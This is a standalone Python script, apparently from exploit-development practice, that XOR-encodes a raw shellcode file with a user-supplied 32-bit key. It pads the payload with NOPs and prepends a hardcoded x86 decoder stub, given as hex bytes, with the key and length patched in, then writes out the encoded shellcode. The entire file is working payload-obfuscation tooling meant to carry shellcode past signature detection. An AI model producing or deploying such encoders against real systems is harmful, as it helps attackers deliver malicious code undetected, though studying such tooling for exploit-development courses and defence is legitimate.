#!/usr/bin/env python3

import struct
import binascii
import sys
import os

if len(sys.argv) != 3:
    print("Usage: %s <payload-filename> <key-in-hex-format>"
        "\nExample: %s shellcode.bin 0xdeadbeef" % (sys.argv[0],sys.argv[0]))
    sys.exit(0)

# Check key is a minimum correct

try:
    key = int(sys.argv[2], 16)
    assert key > 0 
    assert key <= 0xFFFFFFFF
except:
    print("ERROR: Invalid key")
    sys.exit(1)

# Load payload from file

try:
    payloadFilename = sys.argv[1]
    with open(payloadFilename,'rb') as f:
        payload = f.read()
except:
    print("ERROR: Could not read shellcode from file %s." % payloadFilename)
    sys.exit(1)

if len(payload) >= 1024: # 256 * 4
    print("ERROR: Payload must be less than 1024 bytes long")
    sys.exit(1)

# Align payload length to multiple of 4

payload += b'\x90' * (-len(payload) % 4)

print('Payload length:', len(payload))
print('Key: %08X' % key)

# Encrypt shellcode with simple XOR encoding
 
keyBytes = struct.pack('<L', key)
encPayload = b''
nDwords = 0
for i in range(0, len(payload), 4):
    dat = struct.unpack('<L', payload[i: i+4])[0]
    enc = key ^ dat
    print("  Offset %03d Data: %08x  Encoded: %08x" %(i, dat, enc))
    encPayload += struct.pack('<L', enc )
    nDwords += 1

# Generate decoder from template

# $ nasm -f win32 -o decoder.o decoder.s
# $ objdump -d -Mintel decoder-2.o | sed -n -E 's/^\s*[0-9a-f]+:\s+(([0-9a-f]{2} )+).*/\1/p'  |tr -d '\n'|tr -d ' ' 
decoder = binascii.unhexlify('eb145eb87777777731c980c177310683c604e2f9eb05e8e7ffffff')
decoder = decoder.replace(b'\x77\x77\x77\x77', keyBytes)
decoder = decoder.replace(b'\x80\xc1\x77',bytes([0x80,0xc1, nDwords]))

# FOR DEBUGGING: Breakpoint at beginning of decoder
#decoder = b'\xCC' + decoder

# Final shellcode

shellcode = decoder + encPayload
print("Final shellcode: " + binascii.hexlify(shellcode, ' ' ).decode())
outputFilename = os.path.splitext(payloadFilename)[0] + '-encoded.bin'
print("Writing to %s" % outputFilename)
with open(outputFilename, 'wb') as f:
    f.write(shellcode)
